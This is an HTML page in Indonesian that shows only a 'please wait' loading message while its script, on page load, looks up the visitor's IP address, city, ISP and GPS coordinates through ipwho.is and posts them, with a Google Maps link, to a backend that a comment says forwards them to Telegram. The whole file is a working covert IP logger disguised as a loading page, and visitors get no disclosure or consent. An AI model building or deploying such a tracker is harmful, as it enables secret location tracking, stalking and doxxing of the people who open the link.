<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Loading...</title>
</head>
<body>
  <h3>Mohon tunggu...</h3>

  <script>
    async function getIP() {
      try {
        // Panggil ipwho.is (HTTPS)
        const res = await fetch("https://ipwho.is/");
        const data = await res.json();

        if (!data.success) {
          console.error("Gagal ambil data lokasi:", data);
          return;
        }

        const info = `
📡 *IP Terdeteksi*
🌐 IP: ${data.ip}
🌍 Negara: ${data.country} (${data.country_code})
🏙 Kota: ${data.city}, ${data.region} ${data.postal}
🛰 ISP: ${data.connection.isp}
🏢 Org: ${data.connection.org}
⚡ ASN: ${data.connection.asn}
⌚ Zona Waktu: ${data.timezone.id} (${data.timezone.abbr})
📌 Koordinat: ${data.latitude}, ${data.longitude}
🔗 https://www.google.com/maps?q=${data.latitude},${data.longitude}
        `;

        // Kirim ke API backend (untuk diteruskan ke Telegram)
        const send = await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: info })
        });

        const result = await send.json();
        console.log("Result API:", result);

      } catch (err) {
        console.error("Error:", err);
      }
    }

    getIP();
  </script>
</body>
</html>
